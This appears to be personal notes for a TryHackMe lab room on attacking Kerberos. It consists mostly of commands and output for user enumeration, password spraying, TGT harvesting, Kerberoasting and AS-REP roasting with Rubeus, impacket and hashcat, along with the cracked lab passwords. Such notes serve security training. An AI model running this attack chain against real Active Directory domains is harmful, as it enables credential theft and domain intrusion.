+++
title = "Attacking Kerberos"
+++
# https://tryhackme.com/room/attackingkerberos

```bash
=================================
10.201.92.231 -- domain.com -- win/lin x32/x64
=================================
vpn-connect
echo 'export TARGET=10.201.92.231' >> ~/.zshrc && source ~/.zshrc
echo "$TARGET CONTROLLER.local" | sudo tee -a /etc/hosts

sudo nmap -n -Pn -A -p88 $TARGET
PORT   STATE SERVICE      VERSION
88/tcp open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-10-18 14:08:07Z)

# Attack Privilege Requirements -
#     Kerbrute Enumeration - No domain access required 
#     Pass the Ticket - Access as a user to the domain required
#     Kerberoasting - Access as any user required
#     AS-REP Roasting - Access as any user required
#     Golden Ticket - Full domain compromise (domain admin) required 
#     Silver Ticket - Service hash required 
#     Skeleton Key - Full domain compromise (domain admin) required

wget https://github.com/Cryilllic/Active-Directory-Wordlists/raw/refs/heads/master/User.txt

kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
2025/10/18 15:16:18 >  [+] VALID USERNAME:	 administrator@CONTROLLER.local
2025/10/18 15:16:18 >  [+] VALID USERNAME:	 admin1@CONTROLLER.local
2025/10/18 15:16:18 >  [+] VALID USERNAME:	 admin2@CONTROLLER.local
2025/10/18 15:16:18 >  [+] VALID USERNAME:	 httpservice@CONTROLLER.local
2025/10/18 15:16:18 >  [+] VALID USERNAME:	 machine1@CONTROLLER.local
2025/10/18 15:16:18 >  [+] VALID USERNAME:	 machine2@CONTROLLER.local
2025/10/18 15:16:18 >  [+] VALID USERNAME:	 sqlservice@CONTROLLER.local
2025/10/18 15:16:18 >  [+] VALID USERNAME:	 user2@CONTROLLER.local
2025/10/18 15:16:18 >  [+] VALID USERNAME:	 user1@CONTROLLER.local
2025/10/18 15:16:18 >  [+] VALID USERNAME:	 user3@CONTROLLER.local

# mono /usr/share/windows-resources/rubeus/Rubeus.exe

Username: Administrator 
Password: P@$$W0rd 
Domain: controller.local

sshpass -p 'P@$$W0rd' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null Administrator@$TARGET
cd Downloads
echo 10.201.92.231 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts

### TGT harvesting
Rubeus.exe harvest /interval:30

### Password Spraying
# NOTE: can trigger account lockouts
Rubeus.exe brute /password:Password1 /noticket
// [+] STUPENDOUS => Machine1:Password1

---

wget https://github.com/Cryilllic/Active-Directory-Wordlists/raw/refs/heads/master/Pass.txt

### Kerberoasting
Rubeus.exe kerberoast
// hashes

sudo impacket-GetUserSPNs -outputfile kerberoasting_hash.txt -dc-ip $TARGET controller.local/Machine1:Password1 -request

hashcat -m 13100 -a 0 kerberoasting_hash.txt Pass.txt
// SQLService:MYPassword123#
// HTTPService:Summer2020 

### AS-REP Roasting
Rubeus.exe asreproast
// hashes

sudo impacket-GetNPUsers -outputfile asrep_roasting.txt -dc-ip $TARGET controller.local/Machine1:Password1 -request

# https://hashcat.net/wiki/doku.php?id=example_hashes
hashcat -m 18200 -a 0 asrep_roasting.txt Pass.txt
// Admin2@CONTROLLER.LOCAL:P@$$W0rd2
// User3@CONTROLLER.LOCAL:Password3
```